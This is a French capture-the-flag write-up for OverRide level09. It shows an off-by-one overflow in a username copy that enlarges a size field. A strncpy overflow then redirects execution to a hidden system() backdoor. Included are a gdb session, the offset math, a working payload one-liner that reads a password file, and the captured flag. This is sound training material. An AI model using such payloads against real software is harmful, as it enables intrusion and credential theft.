### level09

Arrivés à cet exercice, nous remarquons très vite la fonction ``secret_backdoor`` présente dans le code.
Dedans, nous retrouvons une fonction system, qui va nous permettre d'exécuter une commande bash.
Si nous recherchons l'adresse de cette secret_backdoor avec gdb en runtime, nous retrouvons ceci :

```bash
level09@OverRide:~$ gdb -q level09 
Reading symbols from /home/users/level09/level09...(no debugging symbols found)...done.
(gdb) b main
Breakpoint 1 at 0xaac
(gdb) run
Starting program: /home/users/level09/level09 
warning: no loadable sections found in added symbol-file system-supplied DSO at 0x7ffff7ffa000

Breakpoint 1, 0x0000555555554aac in main ()
(gdb) info address secret_backdoor 
Symbol "secret_backdoor" is at 0x55555555488c in a file compiled without debugging.
```

L'adresse est donc 0x55555555488c. C'est l'addresse absolue de la fonction, obtenue durant le runtime.

Nous avons aussi une structure présente dans le code :

```c
typedef struct  s_msg {
    char        message[140];
    char        username[40];
    int         size;
}               t_msg;
```

L'inconvénient des structures est que toutes les valeurs sont les unes derrière les autres dans la mémoire.
Cela signifie qu'en cas de dépassement de capacité (overflow), nous pourrons écrire dans les données qui suivent.
Dans le programme, lors du remplissage du username, nous pouvons voir cette boucle for :

```c
for (int i = 0; i <= 40 && s[i]; i++)
    msg->username[i] = s[i];
```

Le problème étant que le username ne possède que 40 emplacements mémoire (0 à 39), or ici nous remplissons jusqu'au 41ème emplacement (0 à 40).
Si nous écrivons quelque chose dans le 40ème emplacement, nous allons donc écrire dans le size de la structure.

La fonction strncpy va écrire le nombre de caractères qui sera saisi dans cet overflow :

```c
strncpy(msg->message, s, msg->size);
```

On doit calculer l'offset pour écraser l'EIP avec l'adresse de secret_backdoor.

Dans handle_msg, au moment de récupérer la structure, on voit :

```assembly
 8cb:	48 8d 85 40 ff ff ff 	lea    rax,[rbp-0xc0]
```

De plus, il y a un unique push de rbp :

```assembly
 8c0:	55                   	push   rbp
```

On a donc un offset de 200, on écrira ensuite 8 octets pour l'adresse de secret_backdoor.
Cela nous donne 208, soit d0 en hexadécimal.

Il ne reste plus qu'à écrire notre commande :

En premier, la partie qui va remplir le username et écraser la valeur de size avec d0 :

```bash
python -c "print('A' * 40 + '\xd0')"
```

Ensuite, on écrit 200 caractères de remplissage puis l'adresse de secret_backdoor en little endian :

```bash
python -c "print('B' * 200 + '\x8c\x48\x55\x55\x55\x55\x00\x00')"
```

Et enfin, la commande que l'on souhaite exécuter :

```bash
python -c "print('cat /home/users/end/.pass')"
```

En une commande, cela nous donne :

```bash
(python -c "print('A' * 40 + '\xd0')"; python -c "print('B' * 200 + '\x8c\x48\x55\x55\x55\x55\x00\x00')"; python -c "print('cat /home/users/end/.pass')") | ./level09
```

Nous retrouvons ce résultat final :

```bash
level09@OverRide:~$ (python -c "print('A' * 40 + '\xd0')"; python -c "print('B' * 200 + '\x8c\x48\x55\x55\x55\x55\x00\x00')"; python -c "print('cat /home/users/end/.pass')") | ./level09
--------------------------------------------
|   ~Welcome to l33t-m$n ~    v1337        |
--------------------------------------------
>: Enter your username
>>: >: Welcome, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�>: Msg @Unix-Dude
>>: >: Msg sent!
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
Segmentation fault (core dumped)
```